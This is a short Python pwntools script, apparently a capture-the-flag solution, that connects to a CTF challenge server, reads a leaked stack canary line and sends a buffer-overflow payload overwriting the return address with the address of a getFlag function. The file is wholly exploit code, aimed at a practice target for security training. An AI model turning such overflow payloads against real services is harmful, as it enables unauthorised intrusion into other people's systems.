from pwn import *


conn = remote('ctf21.softwaresecurity.no', 7003)
print(conn.recvline())

first = b'1' * 40
second =b'q'+ b'a' * 31

eightbytes = b'a'*8
canari_addr = p64(0x7fffffffe098)
#second = p64(0x4010f0)

getFlag = p64(0x4011d6)
#what = p64(0x8949ed31fa1e0ff3)

conn.sendline(first)#first+canari_addr)
print(f"first length {len(first+canari_addr)}")
canari = conn.recvline()
print(f"canari {canari}")
payload = second + getFlag
print(f"len is {len(payload)}")
conn.sendline(payload)
print(conn.recvline())
"""payload = second + getFlag
print(f"len is {len(payload)}")
conn.sendline(payload)

print(conn.recvline())"""

conn.close()